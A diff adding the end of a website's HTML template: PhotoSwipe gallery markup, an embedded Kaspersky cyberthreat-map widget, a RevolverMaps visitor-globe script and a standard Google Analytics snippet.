+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
